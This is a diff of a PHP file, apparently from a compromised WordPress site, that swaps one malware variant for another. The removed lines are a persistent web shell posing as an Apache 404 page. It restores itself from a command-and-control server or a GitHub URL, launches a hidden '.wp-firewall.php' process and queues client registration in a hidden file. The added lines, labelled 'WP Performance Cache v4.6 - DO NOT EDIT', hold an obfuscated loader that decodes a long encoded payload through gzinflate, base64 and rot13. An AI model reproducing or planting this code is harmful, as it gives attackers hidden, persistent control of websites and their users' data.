-                @shell_exec("php '$dir/.wp-firewall.php' > /dev/null 2>&1 &");
-            }
-        }
-        
-        // 3. Check/restore main shell
-        $mainFile = SHELL_PATH;
-        if (!file_exists($mainFile) || filesize($mainFile) < 10000) {
-            $payload = @file_get_contents($c2_server . '?urlver');
-            if (!$payload) $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/' . SHELL_FILE);
-            if ($payload && strlen($payload) > 10000) {
-                @file_put_contents($mainFile, $payload);
-                $restore_count++;
-            }
-        }
-        
-        // 4. Re-deploy if missing
-        if (rand(1, 100) > 90) { // Every ~10 checks
-            deploy_distributed_network_backups();
-        }
-        
-        sleep($monitor_interval);
-    }
-    
-    // Log summary
-    $summary = "Monitor: Checks=$check_count, Restores=$restore_count\n";
-    @error_log($summary);
-    
-    if (php_sapi_name() === 'cli') {
-        echo $summary;
-        exit(0);
-    }
-    
-    exit;
-}
-
-register_shutdown_function(function() {
-    // Yanıt zaten gönderildi, connection kapandı
-    // Bu noktada HTTP isteği yapmak HÂLÂ sorunlu olabilir (aynı Apache),
-    // Bu yüzden doğrudan dosyaya yaz — HTTP kullanma.
-    global $c2_server, $client_id, $debug_mode;
-
-    // Kayıt isteğini kuyruğa al (dosya bazlı, HTTP yok)
-    $queue_file = __DIR__ . '/.mori_queue';
-    $entry = json_encode([
-        'id'        => $client_id,
-        'timestamp' => time(),
-        'sysinfo'   => [] // Agent mode'da doldurulur
-    ]);
-    @file_put_contents($queue_file, $entry . "\n", FILE_APPEND | LOCK_EX);
-});
-?>
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html>
-<head>
-    <title>404 Not Found</title>
-</head>
-<body>
-    <h1>Not Found</h1>
-    <p>The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</p>
-    <hr>
-    <address>Apache Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
-</body>
-</html>
+/* WP Performance Cache v4.6 - DO NOT EDIT */
+$_166de948="\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65";
+$_d0721e25="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
+$_cc983f38="\x73\x74\x72\x5f\x72\x6f\x74\x31\x33";
+$_3dcf9ab0='';
+$_3dcf9ab0.='7o3YqugUgvN6e7KdU8VbUvIt4HSFxh0vEHbHPHyf83IVleVCkpWXNNxvvjNFmtEVHnM69nwi/X5rsJqqj5dJW2sxzID/pe7x7xqR';
+$_3dcf9ab0.='MREzWNvX8dadflkKxpmZrZrBUsh9T19++sisvF/S7i7ugwu62qmMRq8g1kqSGrkf7736KzmhoQs3wdaV6lwhUfEOxgG8Fm8BkYH4';
+$_3dcf9ab0.='vXZBCVhua5lUbmA4f7xfjgRxBVi9FqQSJb3s/l5dg5XWU0/XyqKs/67ERP8THqfsvZ39jlCkU//wsjy/ZVthfJLFkOqOYCkEI7Gw';
+$_3dcf9ab0.='6OVrEGYOQfKLUjHQZLyRUCvqitvt2WHVEg1kOY39/as9jB8Tpqao6BOjnciEnOWUt9bTAymow8BmpYDviiFj/5ySq4AWC+bzX+WS';
+$_3dcf9ab0.='87tdQinC4Bs+jsU2/g7EmMIs0xrbwX+Q0nE2sQHBdzWwPz3T4Gg/Rxnwdiv+quw8BN0FJW7n63QFc3oQavtigV6nu981Q0+8j+n/';
+$_3dcf9ab0.='izbrUoq2z8pi97r8H7T2gvL8CD7kx+uCWhZJYZj4TvIOdkA1t/Yl4zWyIDEij8zdrC/730Tob7PIOWBl1j2G8pP/ntIkUZJWIkJY';
+$_3dcf9ab0.='1XK6CVwB0x9Y+VzrbCykSR9tI8iA1foBQa6N8d1WBNknt3NLGfepmgxbvbCJSQne5oruEaxFGjC8DaiADYF/g/ZQDAErWS6Ubl7f';
+$_3dcf9ab0.='YR+5/RH36VJwbSi2Qy4rgCnCJf83qeq3sbN5KtAjzn/RS7tTB+Sb+un+3efaNYotU4OUBV6FZcrgcvIjlKe+VNzjoX7Hd1SbSLV1';
+$_3dcf9ab0.='5sMjIBC+hWK447N18bqOhpV9qjLuIXQy/s3inU156TJCmxme+sMBR9MCmjrCH+hjhFT/IZDG0snGtWd0i1KRFidcEn9neDbhbA3Q';
+$_3dcf9ab0.='jpoklkg6fS9Oh9Qr1iMudlKdjzg48QZqeAHQ1LTF0Y5j9LPsXfYdNI4W6RS2xO8hDCVEjPh06NR6dD14KkELeU3XC6e5oC9LAZGE';
+$_3dcf9ab0.='5forKiZDfAC+kesorl/h0zuiBhet2EEu0zcURjO8Bc9yQEDYH1+fVEOAVwwapC7Gb/el+Cvt9DdrJufiNR3PJK3lEUt0G6jMO5Ac';
+$_3dcf9ab0.='COYyquDAXhZ4BTfA/HzaK+ni+Z9ejZsWqFs2YjsKlGtRQUXqQXok+Cbfvf4TjKHoGhQ1yq+CVit56tMie9g+2W1r9/kBNZ2rO28a';
+$_3dcf9ab0.='DGmlO/1jpw25QPsjuN3PMuhqKNYz7tJwGaPqGQiGBYkBjxaD6Drq8+gjBO2SinieVrP9NY9Aed4ijavnGXXWC7vrkbBx44+hR78K';
+$_3dcf9ab0.='RR7T4Lm7LqXs+XCmGQrw8UjFKFp/Qbo++UcRCjOAGcCenOlZYimx2h9ZE8RxsNiiW8aLw89ugdAcMkPR122LpmXSLI3/BCHUI8x1';
+$_3dcf9ab0.='bSP/QDgtq+U346PKKPsORVoLu1T/r1CiEZCebs9a2YBjp5104VbLjvweiGt6h4o/84W0bja+FbYbCBlpW5yz38TS1LMTRcef+NcD';
+$_3dcf9ab0.='9dtzNFTOentukd0ORtP8sw0V25rKy9rjJVZ3wMCS2u9CX43Dd6oANpQjD4JEOpQzIutUaLyNrOR+3E6vsFJjgkUppi/kC/9sxLDQ';
+$_3dcf9ab0.='nSj8KUjblg1b5R0Nrv4PhPrGswNLIOuwShVzEUZcAg14qxGbtwOySdj1KQghRruqjn666moujt3HIopvEyRADPZBAVk3Dmwmw7/L';
+$_3dcf9ab0.='2g88/hTtPGCp3ERUe57goT+XHd3E2T4rC280gb63+NittxnwhIqns9lsQNsjR3cMsmjWW4AtUnr+S03R82t66w5h8ZiUQFcvo9sw';
+$_3dcf9ab0.='qgF9tfcY60M5rUb8Kw/hOlWJA6k4qotwYi0REw0ECFjz4WkCNUjyeIS/3Oua2+7U64/9ouscwiJAZp6+fIk/XV6bjhBT+iF4jLAb';
+$_3dcf9ab0.='0RF8vebKLYC3w8EJNNpZfpeis7pNT3QW1k6txGYuxry4QThoGAijcX+yknc4HBSolKh9ipr34OsOpQl5Xc9Or6BYZe4aMZlLqTSm';
+$_3dcf9ab0.='JnVvnYzR+5zfAOc/abLNLC1bKB90TdBt7M+UI9Sb4Ys603vL+Q9rAweYCC24QtOItdLJgceCKe1b7r5iAnRyiZUkWLjkPJRqNKT0';
+$_3dcf9ab0.='NYo86JQFNdPURc7dP/OJ/DmVzTxoXLNBHm54VuhKb8gEpc7N7jLrJqeTcQU0j1SwtA16q78YzbrU+4qvM//SP7tPOSj7O83Qm3VG';
+$_3dcf9ab0.='nWdbALynCGvL5LHu7Yy/yyVXP1tTC+UIpWJ0mcN2te1dqpZLQvMrhCKxbgCPJ1sh87Q7XY3tnoh/bLW1nZcoGDzDc9ufRe6QKyHa';
+$_3dcf9ab0.='SoRhUv0OwoqLRsF5AM5BJaX5x7EpyF4sVJNAbCv3m0GUU1qSQXu8RaNUA9D+jsS2bKGMr7xFevDrwsOH4Th1OiOa6p2bIOH0yL2Q';
+$_3dcf9ab0.='t+oryta+u8RMDx0fnNySU66gDENm+pveXy+I1LXKS+Q9XXbX/N1YkK/jxCNibO5fTb3Yv3fvF6hz2N3/5srkOVqAjf0WA3X6babS';
+$_3dcf9ab0.='mxK3h6X6YFx899660byfkQyexvnq9qgBZPLjfzrhKegze0sgTUUm+80z0s4ebbF7RAGJNqu2rF8V1Rb4phCop6kUU1nZgmgVaEUv';
+$_3dcf9ab0.='rC8M6YQgCFQgz+Y1/hUJjJUmPQOr87v5vpBRKGyN4h/bhYz32okYAmMguxGZTSSiXkjOCmxLjR2KUfpuHEBVLH+8kvKp1DmqQFEN';
+$_3dcf9ab0.='8GxpqDoGocQbS34KdNG9OZI74EaucIB54o2Vzp2loufhxbJuOJQ6hZY2jh4aOfRAWFfXJvEPaDST1zDEy6Fm5nRMH00PC+70RqUD';
+$_3dcf9ab0.='qTJKjOdRfJDvzPMC32F/BQ7yvyGl62O2wTfOs1vefqQcapTV8Q0uDUgqI2pfT9n0wl63k5fVoKWcKWtHoJTqIofTAilSdyLE+Npj';
+$_3dcf9ab0.='UfSdgg046AYnaJn+TQE6dpUx1Wixlmqy+UUviFzqow1e7J3fAhyirSqI78fas8Ws9li01NQpdNMEWMNOZbj7CsSjyMTau/paF5/D';
+$_3dcf9ab0.='C3Voq+xs7+z79U+jpKFRc/4hLktQbK2KZompCmd+F//9XWaZ1/+oA28JWfvUgBO1Y3jYan19lbFcpzTKRugVJb8eVHZiNEJb7hyt';
+$_3dcf9ab0.='LAE578VyfblAFfYEa4RBAoPWDqCOtHoJNxx6UCclv4aPSASpwvKltJRoV8tvVPHCFWTXrhCNZ/eGQOlHyvRxqSf0yZphobGxDQwz';
+$_3dcf9ab0.='wT9TL/viQnZ6q25AFd18xoMolJW+hnFmZI1nsqIfIrZ5M5gj724ZLUGqX8PQZoXstlfWQ8NMbqvuYmFp3Os9XQbK7HUHBEs+EZQK';
+$_3dcf9ab0.='FGGRf5OtQ0/FobSDDyynPherZVeQIgiiaUpwbSfhLJTWY6KEcNiQpeuZIqJ/2dx3UeOKYM/riJU2AI8x2k8HAYh0qwJmZgoJVOKG';
+$_3dcf9ab0.='R9TNcZ3atGbfhOmyqOwjAtz7Np6qIdqPZzfFXLbD5uNUAn4aBbCNUj2hCaJcZyrcOtwPE0QuQaj4fwojrL03bmrAAj2J3w/o2Ck2';
+$_3dcf9ab0.='n3//fC7yxm+9smAdQOAGXRUyfl9HA+yo80nqskNj2msymR69lrmzT9q2iaUh55iXzjeZ4f2qM2UhqsCgWVnkvP3tvtPgDixDyy2r';
+$_3dcf9ab0.='i26oEPc07AfxmMM/4yHy/8EoN3ysuDW+GJYOTV9kK/ln5VRk7qi1rPrPjSwu2/K6lFENhcTdE+B2x3GuJGNXHVZSjAtPwvjpgDlV';
+$_3dcf9ab0.='XFitJtO8pNopFOsoHeICCCIJZkVYsG/cR1un5sPgM/ECe1g/GtQyHSU8djK3AZeyGwjWRW5LJ9sDNDuS7cc+wD/8zztf9Ebs+QJE';
+$_3dcf9ab0.='Chb1CfOeGDojO/14JuK/7Ju/e/Ide3z0hKUD3Tbq7JjpiJjr6EKtZsZthljx11wvkYgC3OK+JCBteEBiua+38Np+b9owd4qdvfo8';
+$_3dcf9ab0.='cKEYagi/+S//N/4aQik4VcMJ0vhY4PWxqQ2XuVTkRHT/CvPu3lQlpJEKNqlF3WQms3V6xyedwIPpOetat1uSBLhdXdVzKxut6GW/';
+$_3dcf9ab0.='mfXGU2eQJyrxVuDHzXGbPM5I29goxd3KjBDbGAq99vW0KPMjuJFeRhzxyvkob1kDDI1tLLVdjwpYeEsALkBjcImM/XuBPalp0Fw+';
+$_3dcf9ab0.='tkc9OWJ+i0DvfKmmFUHgss31I4hCye55+N0XB2r1ujCyAySjFzgWOj6XrGpZED5aFxq+DbpaNovAb0Uten17WPXNgLoqwJXi6tRE';
+$_3dcf9ab0.='UpGgX/l0inJr8JawnOZrE9Auz56KGzrCJSAjGB/wPUQEOXjuFbe86nDC9S50Uto07JGkgYn+iIHyZDY/eXkvLGtjcSLb00QkkXW8';
+$_3dcf9ab0.='ElzOM42t8BC7+pUuIwhr4OeG5fN5GDnjC0Sv8O90EYmITkeckX5TYOj0E0ACnrJTRnO3bZ5bCwN6NYxatQ7JSU72RS+uuW9j4baU';
+$_3dcf9ab0.='Y/SiTtvtYj9I4qTHfrxlCOA5TV7B6NJEqQCtLBMP54466ccnvB28Bqn6t8qY1lwsgBdmLMKntJ2CkeEFaK5IoY463Ax/BT4qAb9s';
+$_3dcf9ab0.='Ur4qU27fUG1iUzeNaSUw6VtHj9iCsmubLt2zrm+1/+Cg3ro+d+CJ7ySIfCaQHlbqiN06KSnAcwBVxxP9hgJB5S7vv6YonKzShnvL';
+$_3dcf9ab0.='EZTkY1zW8GtL4FHRoOHcQBPcXijrlbdOgLF5brD6DrnF7vw7YfVTR76BaWPEKaghqza+JlWgdLkahksOPLaWVtOc7yjmIIU74k//';
+$_3dcf9ab0.='6S7BGSBV0WO46fQI6SKi0OoGLaDBow2h7ZMgwjQoG5mxEQgNLLBNDDAOR41etTMkvjGYtF2OZ+5Z40gk3CpaKbXJGSJdVzFIY0de';
+$_3dcf9ab0.='Z9uO2HLuQmtXYyfcP2oFIeWz1FEM6vW9dlDQvt0FNMePzT0Q/mbpRf0J45/yoOKUNWF+HgJSyI6J6fba617S5fzrvSmcEn7N9N0B';
+$_3dcf9ab0.='1kj7iUhlKeYoJRzU6nwxLCR26Xt5QvRpCqkAMGLzbc6jcQcjFhx8bhLLegGphME7od+UKQwwcJAlqU413Yz0o1d4H7H6lAvDTCDE';
+$_3dcf9ab0.='RradPL4GZEY0Ri86AGEkq1oiUOmho6WlM3swPZ1fEWafhFc3H+c0OfwkFqiOKG/OLlEOpmkgQ8VBtQcfJ8rtJ6SDBFswlkcQeXJT';
+$_3dcf9ab0.='Juz53yALpIXsb1KRzcsIThwCMYex+Z43Wg0eWsjcne7jGcXeMOVZGm3EnVrwOyPpgD7jHbZtTVf/0w9C3PiA2qo5MLEU12wZecdX';
+$_3dcf9ab0.='SJyiepIoJrU1JoHxi12lDTuqOh2JiiNAWEVc8CSDX6TmMqA0WTa83Sh2BVy6CoMBfBrzXZF0Si9hUrjsUhqngY7O5bzUQk9bkaVp';
+$_3dcf9ab0.='E5BbR6TgtEmdx9GbjNCZDN/4g2nlWIAi22nuzVPgfaVqb2kTTzjO4rLCvQCJVh5BUV7g9b42Q7rO6wPd6p7yTH1UKMswdnhJ1XSp';
+$_3dcf9ab0.='rA181xXeyYJPQHX7P+fIwxSJJcIP3qOCHOjhBfhgJTdql5H7U3yQnDiU/+u4L2qaN/J5a0hQl0cobW2OBQT1RPyZGcXoYPebgdpJ';
+$_3dcf9ab0.='WbarX0NaqQ2StQEq0aCMePx75mbNwzHx4fiVkgBevatfUalSIuLBjoRYrph2tsvyqyYOOICMHhdGJaOdjpzlBwBjiF929c9g7Olq';
+$_3dcf9ab0.='rAdpW5HqGHtlmDJEJ2nPu5D1jWWZJfhYlj/A5qGVn+TfG+OQAG+GiL68Mt8QZtRG0JujWF6OgTB6AtDPdQBMjvMsvoAbSWNp5xH4';
+$_3dcf9ab0.='rGygv+sou0sUbel5QYw8FiG9v0P82gwS8hSSHARgL6rNEu8WZx5ptI0tlsezVWc2rjZ0BfqnMRx29f+POCniU1lcmDVzDYFaRjUy';
+$_3dcf9ab0.='0U7h4BIOWI2YKwNOktwcAJDWEP3c7Lunorv/erUJvnIUHaLtyj05V1TY5RirGUuKajmUayuro3FQvjodkQVxv6EoNoY0IT5dDIlY';
+$_3dcf9ab0.='Z6QeEB1U4G1+tvgq2Bojjg1n5dH9jOGxoydQu7VuNR5buquuCRaH7w0PkQK6mwQ5K2+SLboeIzrVqUUcEAE6+LdarB/9WOFf8WWv';
+$_3dcf9ab0.='7/Oney76puIVo2Zrl+i3yxd5X6o0MrBE+SY+u8Fbk/152nde3VR5GBm4Q4DFWN6jrOm2M0PcXIVnYK90MFviNY/oIDKnB8TEjzV8';
+$_3dcf9ab0.='4oR/6IrDpu4uTlM60UZs6BqWsXKyi4PX5KXI8JUvg0Ig4Al8v+sPf/emIxKD6Hp4KIbXWPzRofF1D4v61HmXhaBYs7VgoeVeNEj6';
+$_3dcf9ab0.='3ATqSubxjmW0DkLJb5MHRZBZoW4pDyJhxmIzLAlMk8viEGqZ0SNN18XCL/+dAsGUMD95OBOWt7swNHd5iFb8bB/SzKGAVAfPqHxz';
+$_3dcf9ab0.='jWlo11FBzqrQM2o/P+PTdF/mFmHqvd3uWfjAR4JmUlZUV+qc8UgdPrvXAIIqsQkjnvqYYN8ou2Cv5F9Exe+pr3qdIElwKyhCfBl5';
+$_3dcf9ab0.='VDIUUaskk7vSGFJIwZyDzXP5pwFAxDBBkj79sKLP6Q7xQmC0tTe+OBJ0qtZ9yuGMEsWiy3ZInKX6zVAlykgjEPNSI2DXob4mnXjq';
+$_3dcf9ab0.='a0xSHaQCVeTabVaAZB1MI6bvAFjp5WMVat8yvkuHf4pl4miQCB5Nzcdo8CN+YletED+U1hubOvMaYORsi1v1yhq1UR4PtrVpb+yh';
+$_3dcf9ab0.='jQHvAwqMgVRgEtQ8OXQRUFfPFmcQnn/jqQZ8Lwg5vBkq4bmXKC9x8oFneyDE7XzvOhN5LURrDXDuhH2AQVgRy9IXvwRseVtT3TLA';
+$_3dcf9ab0.='UUT92kPfpEN0YpAxTr0m4EIvaoWaIfuL2JuLqIh6JSHEYTg8R2MK/bh0Uou2SGPeq7AtBv8olSC1EnBbMzN3k9g3+fBbB6C64ypC';
+$_3dcf9ab0.='UkotOdry6Ol2bbdghul7zFcneFYeJKIqXcWRfchnU5S8c+MTaf42W2AQZup3L5dU1+NsdzpCOgZmhU8C0uob023+SnjQArkrQhws';
+$_3dcf9ab0.='Ahr6PbSyTWNUQgqYNZGsjD09PfKxjl+jCdy5DOkSR9fHGuhy/ocTpTmzqcBEz8iRQL9UDGSHwp+jt5BGKrvhmeOkflmpfVLOHHdF';
+$_3dcf9ab0.='j6hXKYl0s6PJ07TFzoLfMocOVADv62+2HPyda5eU9f3hfV8rpCINY9p65Zn0eVHTfcdHA1vgBXdyQvfFvYnv5ZbKvs/kY4BCC5/Q';
+$_3dcf9ab0.='/68FK5k9+TKHurfYTwxC3bym9cxFI/6L/MlUiavBu4X8eX/8RIG7+1+t3yHjPegNxRnQ6q//NeCYhVYbeGCTGBFs4FuvsIbKw1PR';
+$_3dcf9ab0.='ZG/ngndoylEYbnWmfJMWDyV3QAHfwZLj2iTH0H65cPqpDvhqHiaxG2vsH3cGDofDN2ZiwVpBBQG6u0TviD5u8yFrHbOAnKPdpe7M';
+$_3dcf9ab0.='BDIApyIFHMCM/V3vWgtTYIm65dhUdIOc9pLYXP9Jlyr16pbHecOaR8ZjbM0tiNo7Vx1HOPyGDiuYzFz+1kNg0KSjabGawKo0oacB';
+$_3dcf9ab0.='yFs9BWcZObTKsCm5asOUU38rqI0DXl+V4oykMUSO4qY7+gRwcEl2cJZgThhndMmB72ldeuM2Hpp1WJm3J2GScDvfdXckE2KdchVm';
+$_3dcf9ab0.='h+7aRXKcGabjDvauh4I4m0MunCrNiOcWEhPTyDRq5U7hjI2lVc4mBuCxmPzJmDXiQeqK2OpHW6Ii9abHalzfoTCQOgKrxhDk3Y0e';
+$_3dcf9ab0.='LdA74pCttYJRNbtBZVDQwOdhklS+RORHUZbLPUJd/k3BPrivi+K6t/bFirMbPsjJvDDr8QRjpsE5W+jRblGt7l8BqcMyvNz6Y5G7';
+$_3dcf9ab0.='n0z6i5Ld2zAsr6ro+NvnXUynhfCNPVr/MQvmH3RNeEXez83vOOlh4ciYfeDfotPud/vYy3MkN+5pkL/3i23hTJZ3VZuIsTq/81gh';
+$_3dcf9ab0.='//IOn3A/77v5q0l++2vPIfsXWTxgMMEUCIVgfWvWczgEHPsF8tKtyQRH/a3JC6IoQhA4jOMBEOySgMpRBIDVnO0cQO5RbmBgE2s+';
+$_3dcf9ab0.='vGv7SXBq8RYBSRCd1nvXu6sIGA0KY4RcsXErB1lMMX9NJW0fWURUYdQWZQd1Y000/lz4+oXFzMX2glz5/WufvkmfZZf7TULhHdFm';
+$_3dcf9ab0.='tYLhW25wz7I1gtKYzZXferZfdwaudP4URYQK3QmJkE8H2rnfeqBfMmG1sU9aM/81jOpcvoVQDwAxPbzjgy7nwq6St4UsrSEsYBK4';
+$_3dcf9ab0.='IoKVuhaBNuahCQHfq+uA4HK/OoIEFMglKZd0kn4cFDxEyKj7DqfigA88VJsd0ge6FHaPq0zhoLxwapPAvd/fhM1JXdfMpIhu+dYZ';
+$_3dcf9ab0.='S3dvyELur6zaFtgAk9P02U1vRVmXpeoeLzxE/gRUnJzOU8wZ4uRmiPJ6RxemfYjnYIM5TDgLJ6ALycrqE7ujVmreRMXSo44yQoVv';
+$_3dcf9ab0.='hi55rB4QNHV0AgCK2u+7p477btSNaxlSOqTsXgK2HMRuCrbPTVxS1snJayP1+yu8yFKtax6vXEP7he5O3okmwLVJQbrE0h3T6kJk';
+$_3dcf9ab0.='nULZGGmzUn64fQTiaTRoIFYpHkJySXsYpQ7RqY8+dT382K+eLlLcIQ2T23cScC6j9YCzD1RxIW5j42iLWcoZ7OF+0g7Zua/dB6KM';
+$_3dcf9ab0.='/BDyJCNU4HINoqOFFTP33M+bQAeAhgoU3VEZC6hd+JmwPxGWQasHWIg0DNKErLzfn6tFeUQlwc+Gq/NNFVdrWXSj6gtMgVPQOJ2A';
+$_3dcf9ab0.='baRpKeGHldaAZyrE7zSKKnBF/Brh6800AGYLiXcSC6dSypspYduBrhcWp46uFfXeRU1cCimlYbwQRKVQ/wydp0HNq7+BSFnhCikl';
+$_3dcf9ab0.='Ciwjl1Jv1YlSMbmEJWbkKy+YsPtG+2czkGShZBW5etzg0AhJRvoN9JaqAjhxevS9rVn/Y+Y3eJgTX1h4anbb02ASQxolBCaoam+s';
+$_3dcf9ab0.='xCZa1pmv1hxLaDnXMlSopAxQ5Dm76XleELqy/CvKpRPUUoLXMosaR3UyimCJEWhsXJ7ZVnXMl4KoofuSOsKBoiWi5XbBochpioZg';
+$_3dcf9ab0.='sz4aeO7XVLMY2s4/g+pIq7C8vq3plg2Xh3ejvI3A7JCS3Gl8fMioryAmh49p7EWDQWsVcTl4mY8r8X+UGxPEFu/fyal/UdRjPIy+';
+$_3dcf9ab0.='NQ5i1I0rfHIOH9WeRZKOjnH42Abiy4MKlL+QSoG7JifWEtUgi1/ggyTLv89Y9Amc+mSD+JiGFr+oRbROiXL9jg/SKESwN72feTjp';
+$_3dcf9ab0.='Uk+2GNV+sqf8CZDVCzie9Rb+gL62q4NBC62fmcuVUS2lx2Ag/pqcRS+IF0sAUJNHOBBx1bH/zNov+rU+eiuWYhW7/cFV1l+ou01I';
+$_3dcf9ab0.='xTnokJOvM3g3+1tfyFd1qGXAXZ8nQB0fQXtln+yA0GVvyFynp4qjD6ZjSPdsrBoV0sojlHb+3RBhEKyOsZVAHGFG/X2uuy10K8ln';
+$_3dcf9ab0.='niRy4dlSdxMLNWdDfG6lfpb8GFOVjVnCtKxcy14qoT0pA/ZtpAF0VJKglEkDtqPN/A4H+F011ABoOiJ++UCOc/rvD6YDpyZU5dTN';
+$_3dcf9ab0.='B47vzIsiP+1iyEce91KAbpMvsll4sTaTXUpAhfRjrSpEg9SxQnp3noYtbdrYhw0qmXrx+gIPksmseXPPqIoXbjYy1UOnz6Js4toL';
+$_3dcf9ab0.='VRpWjCzqWsk29dm0G3VDcUedYACHtmuwqhaHBFJ+C5xRWw8fli2CC7+Qm6Y74q9UyFWyxhj8d0wFe9sSt6jFnMYpcQTO2en25NMA';
+$_3dcf9ab0.='vnHxZD1iwFop+cRv1Hvd0Au9WGJ6A+t0vaDMg9SEsQMSj2p01ZJgIAoQg1phDBJfLtTJqNbKVVkUYnk0gTM0EmTnpFRgiVqvyhQq';
+$_3dcf9ab0.='COW6nC8yEa+zkuY/Pv5pHwnuSsQMqBQUdgqZ+90DrRh9v5bUgsyb9cPIZuWgU5KXYSWFDwW1OygMfv+hxfyJTuEQnD6XbJGuw9gD';
+$_3dcf9ab0.='OeZcNWhQmN84r+KwCJnXu3QuLFZEQbOuOTM+EIdNgw/8Ziajlju4lL9/tq/NHvbft1l+XL6eBZIEwdJzRQAeusbVNQjfHIbgDyjp';
+$_3dcf9ab0.='uZJl3Grxrsl5ZxArklHf7FYhaxfGgTcWgQYlYP5fP7CHh7jjo31AFsBfZnSWVV3NjyRfz7fVNA2mlhFA1/IUDfd4uYWWDIHZ2qkV';
+$_3dcf9ab0.='ToIJjQkZJChvYtYbZgJ+YQ1XMdcrYX2IpbiBXzN4UdEPZYuJJF2Zcp3vNe8cMU5GlCmGXzGj6NmusuCgDNNwRaMESsZC0ZDjPczg';
+$_3dcf9ab0.='uySyKQdLLycLLKkiuw+GWC+dztQVFbM1NoAiE0gmxVzz05GvdwwqETg7F+8SURUkeCy8U7uWt1DOaz4jFRFPTFRj9zhYCfD0gtEw';
+$_3dcf9ab0.='c3nJbpp+LOAs7ho2SfMY1f0oDK44eUpe7YY3aHJlVnyULsffS67s/+5cxq3ynhnot4ZmvkDjrJnEiZZpst1TlGDBmCrgv4qyTshK';
+$_3dcf9ab0.='0z0x4bQvzA9iLmFHLDFVQv2bHKpGkfyREpxJ5Hp1cYtHHKk3E0WrMSujpH8p/KO03AjI23iC9m+GU6Se2mEgRKLIE6JGSXEDS3n9';
+$_3dcf9ab0.='DdWPIhDDPib212/K8FQ/5YQJQLqyO3WG9GXktkpbIOEG4Mz40BwYCWI+mUKGib2jlAWKZ06n6t2QNKDmKhCjkuSqqzMjX72JUSsS';
+$_3dcf9ab0.='hMkJmqDEx9xXaXVEipqHUP3IkGSDl0DDqjIU28VBvaLyUHXJGGJ/VC7AOZ+GpolrHtlgoxNOccjuMAAzHuZ1E4vruIkfY2o37n8p';
+$_3dcf9ab0.='0ngF5UCOkJMo3F/KEJM10MLCfl40ZVwwqZlnJ+D5XOgBW8XZBGc2IP+BuenO8m8zMBriTQs4P1stLRrtK/mFhyHNLEyHZ63zoOrG';
+$_3dcf9ab0.='2zO8PKGNQbogbVhuKDQKNJf+uQbejbmf9IwgmUbzqVScX5gTpZDd5EB/1fBxRw8gssJreJFAVIH5eaFJawHw0Gavl3WNYPCzyuyg';
+$_3dcf9ab0.='GO7oFdHjFiX8bFqxGPF4sqQypx2Wqx7aZUuAQ2YIPajaL+RJTWeZp6Vr1QUixQMHkvZGq4H/heefOmU7XTimJUYdljs3x3v6UL6J';
+$_3dcf9ab0.='+8UophlChgTj1o4P7e4ZdQzYb2+12c99yr+jhgyImHpy55NKjQG1biFzHOSXwPDnnuVcYnHVY89xRe0YgtXyjyorVYBDQxlLA/t1';
+$_3dcf9ab0.='vlThjTYjJmMoecwsb0E9Iwrg1LzXbxtbtw0xXFPpKrlF+ltZE/9RrSqODtRdEcSa1lGM8x3IljKO36SuFzOPGH9U56CbRx0yBQF0';
+$_3dcf9ab0.='2L8YAtlh++6uLFvUmro+7h6eiJ3zAHK5tEul6wEx6Dobi1s5GBFrGSYQhJfJhWrdxX5TKK/vF12UdEqW3M47TTdw/Xk5qRm4TwB6';
+$_3dcf9ab0.='vpgj0urks4zETi1MAvy20QKmMfyVQmPHzbTRmWOyPmpUGWhwbuDCbNEyeiXn2DqptEqYoDCM48MlsqTod35OaYMo1KkW2sAlAGZp';
+$_3dcf9ab0.='AJ8bu+7O3sR4EvihGCnFX+lG8/EyS/CTXf+3zmgoEkXXPdDMcuAmxRjUR4qtkYDibbDaRwobVIgxuuNy61dQ1KBYjYyO4Tbby07Z';
+$_3dcf9ab0.='b3UXbR6sI+EN7NOPMPaRhaJrlErzz6+vMCyoZDaY3jgIoD5/+kmqyM447DqCTFOEHAwdfKB7sq5t+mWPFfW0BU+BmctKvaxZJUki';
+$_3dcf9ab0.='FXmuXTJTpSk65Pbu8kiXQVzRHyThMcsZJz54FGXDpFCuXtc7I8Pal+hSEI7PsW8T9hJtxHMwc6hssy5b2H54yH5CCYa8aVZNX6mB';
+$_3dcf9ab0.='YZ7ci6v0Mln0KZRNPNZZ5DrbfiT2qay5JHZ3w9bHEJVHt9AmalKwOQybpHYbpaUpVxNnLPIYfC9aDiZQtBLx6cjwwPd9RDyn1fDL';
+$_3dcf9ab0.='mKbbtcA5T0t1ZpKRbcVd9HFnTfoD02pPJIxIgAfvrynDZkk/GLPG5ajvn0c5FXxtUm58NYGOA9drIzbkqG181yTfHBEDgbqWIxOx';
+$_3dcf9ab0.='AvB8WlGWgm8tSnYiRhKZETRr9NdIl3X0UAbYJ4WwbpW3HnpYUVPnlaTzWlfW1WWy8NigM9QPyXXadQCOp0GdcYSHK3bGikz9uAMK';
+$_3dcf9ab0.='hOA8OQNrpKk/VNjDN+CY0c1BTVltQxB45DUW9hgfnlpLaH36UOknlMg5SBu8Qv1DX7vVzpBpgjz12f92ockDSnltA65FrrghD4bc';
+$_3dcf9ab0.='RjUvfb/PbsVKiFQd0sMHhOu004CGaKOYQks/+WKMxbct0Oha6zLeBtLEzVk/RuzruL4XFq8waJRuX6XOay0rcZTL44ODuNNbHmIJ';
+$_3dcf9ab0.='Y8slnuEIcbcTKWx0avJ1DM/iv4qVtrZoIk6vYOX6YqoMTNjZfweR0QV1R20HMa+5J1X975ho4iaTmt5TCEroYmr291wx9BTKVLHE';
+$_3dcf9ab0.='Ryps/u1NqQuNf+9DqVS5/vkW94mNCxZx8qgaVuhm4KCU2SzVckvjOYfPmffeNjMZtRgaOFuSI/YR4mFFHFLpx7uKVD6feZivJ8BV';
+$_3dcf9ab0.='VwJ88gXbwmN6+LhMnstQb/AC+iUHLmhd3vuaFWKyGnvZSDNV3uDT/hTcVaXTHzJpqVR8Oo4EmAZHRr3S9uTN55KM3w2sC2eEDvM4';
+$_3dcf9ab0.='RN6/ztyQ5Nw4DiSrvtX3YVjqhSjQtbpK1SAa6XPvhRSCUMSnahMQgpu5dCqSHd0VwIH/LMaqF3mQ8iMcrL2y9rWphWJSCeeMmYqR';
